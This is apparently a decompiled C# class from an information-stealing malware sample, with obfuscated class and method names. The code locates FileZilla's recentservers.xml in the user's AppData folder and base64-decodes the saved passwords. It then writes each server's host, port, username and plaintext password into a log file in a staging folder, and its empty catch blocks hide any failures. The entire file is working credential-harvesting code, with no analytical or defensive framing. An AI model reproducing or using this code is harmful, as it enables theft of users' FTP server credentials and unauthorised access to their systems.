using System;
using System.IO;
using System.Text;
using System.Xml;

// Token: 0x0200004D RID: 77
internal class Class16
{
	// Token: 0x0600021C RID: 540 RVA: 0x00005171 File Offset: 0x00003371
	public static void smethod_0(string string_1)
	{
		if (File.Exists(Class16.string_0))
		{
			Directory.CreateDirectory(string_1 + "\\FileZilla");
			Class16.smethod_1(Class16.string_0, string_1 + "\\FileZilla\\FileZilla.log", "RecentServers", "Server");
		}
	}

	// Token: 0x0600021D RID: 541 RVA: 0x00010C70 File Offset: 0x0000EE70
	public static void smethod_1(string string_1, string string_2, string string_3 = "RecentServers", string string_4 = "Server")
	{
		try
		{
			if (File.Exists(string_1))
			{
				try
				{
					XmlDocument xmlDocument = new XmlDocument();
					xmlDocument.Load(string_1);
					foreach (object obj in ((XmlElement)xmlDocument.GetElementsByTagName(string_3)[0]).GetElementsByTagName(string_4))
					{
						XmlElement xmlElement = (XmlElement)obj;
						string innerText = xmlElement.GetElementsByTagName("Host")[0].InnerText;
						string innerText2 = xmlElement.GetElementsByTagName("Port")[0].InnerText;
						string innerText3 = xmlElement.GetElementsByTagName("User")[0].InnerText;
						string @string = Encoding.UTF8.GetString(Convert.FromBase64String(xmlElement.GetElementsByTagName("Pass")[0].InnerText));
						if (string.IsNullOrEmpty(innerText) || string.IsNullOrEmpty(innerText2) || string.IsNullOrEmpty(innerText3) || string.IsNullOrEmpty(@string))
						{
							break;
						}
						Class16.stringBuilder_0.AppendLine("Host: " + innerText);
						Class16.stringBuilder_0.AppendLine("Port: " + innerText2);
						Class16.stringBuilder_0.AppendLine("User: " + innerText3);
						Class16.stringBuilder_0.AppendLine("Pass: " + @string + "\r\n");
						Class16.int_0++;
					}
					if (Class16.stringBuilder_0.Length > 0)
					{
						try
						{
							File.AppendAllText(string_2, Class16.stringBuilder_0.ToString());
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	// Token: 0x0600021E RID: 542 RVA: 0x0000446C File Offset: 0x0000266C
	public Class16()
	{
		Class40.gcO0h7LzslQIW();
		base..ctor();
	}

	// Token: 0x0600021F RID: 543 RVA: 0x000051AF File Offset: 0x000033AF
	// Note: this type is marked as 'beforefieldinit'.
	static Class16()
	{
		Class40.gcO0h7LzslQIW();
		Class16.int_0 = 0;
		Class16.stringBuilder_0 = new StringBuilder();
		Class16.string_0 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "FileZilla\\recentservers.xml");
	}

	// Token: 0x040000F6 RID: 246
	public static int int_0;

	// Token: 0x040000F7 RID: 247
	private static StringBuilder stringBuilder_0;

	// Token: 0x040000F8 RID: 248
	public static readonly string string_0;
}
